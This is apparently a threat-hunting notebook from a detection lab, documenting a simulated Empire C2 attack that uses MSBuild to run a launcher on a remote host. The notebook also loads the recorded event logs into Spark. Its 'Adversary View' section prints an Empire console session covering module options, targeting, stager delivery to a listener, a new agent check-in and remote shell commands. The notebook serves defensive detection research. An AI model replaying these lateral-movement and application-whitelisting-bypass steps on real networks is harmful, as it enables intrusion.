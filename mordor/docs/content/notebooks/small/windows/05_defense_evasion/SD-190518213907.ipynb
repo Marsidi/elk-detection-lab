{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke Msbuild"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518213907 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script |  |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using trusted windows utilities such as msbuild to proxy execution of malicious code."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_executemsbuild\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > info\n",
    "\n",
    "              Name: Invoke-ExecuteMSBuild\n",
    "            Module: powershell/lateral_movement/invoke_executemsbuild\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @xorrior\n",
    "\n",
    "Description:\n",
    "  This module utilizes WMI and MSBuild to compile and execute\n",
    "  an xml file containing an Empire launcher\n",
    "\n",
    "Comments:\n",
    "  Inspired by @subtee http://subt0x10.blogspot.com/2016/09\n",
    "  /bypassing-application-whitelisting.html\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name         Required    Value                     Description\n",
    "  ----         --------    -------                   -----------\n",
    "  UserName     False                                 UserName if executing with credentials  \n",
    "  CredID       False                                 CredID from the store to use.           \n",
    "  ComputerName True                                  Host to target                          \n",
    "  DriveLetter  False                                 Drive letter to use when mounting the   \n",
    "                                                    share locally                           \n",
    "  ProxyCreds   False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  FilePath     False                                 Desired location to copy the xml file on\n",
    "                                                    the target                              \n",
    "  Agent        True        V6W3TH8Y                  Agent to grab a screenshot from.        \n",
    "  Listener     True                                  Listener to use.                        \n",
    "  Proxy        False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  UserAgent    False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  Password     False                                 Password if executing with credentials  \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > set Listener https\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT\n",
    "[*] Agent V6W3TH8Y tasked with task ID 5\n",
    "[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_executemsbuild\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > \n",
    "\n",
    "__GENUS          : 2\n",
    "__CLASS          : __PARAMETERS\n",
    "__SUPERCLASS     : \n",
    "__DYNASTY        : __PARAMETERS\n",
    "__RELPATH        : \n",
    "__PROPERTY_COUNT : 2\n",
    "__DERIVATION     : {}\n",
    "__SERVER         : \n",
    "__NAMESPACE      : \n",
    "__PATH           : \n",
    "ProcessId        : 6732\n",
    "ReturnValue      : 0\n",
    "PSComputerName   : \n",
    "\n",
    "\n",
    "\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent 38APWSR1 checked in\n",
    "[+] Initial agent 38APWSR1 from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 38APWSR1 at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 21:39:49  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 21:39:49  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 21:39:47  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 21:39:50  https           \n",
    "38APWSR1 ps 172.18.39.105   IT001             *SHIRE\\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:39:49  https           \n",
    "\n",
    "(Empire: agents) >\n",
    "(Empire: agents) > interact 38APWSR1\n",
    "(Empire: 38APWSR1) > shell whoami\n",
    "[*] Tasked 38APWSR1 to run TASK_SHELL\n",
    "[*] Agent 38APWSR1 tasked with task ID 1\n",
    "(Empire: 38APWSR1) > shire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 38APWSR1) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
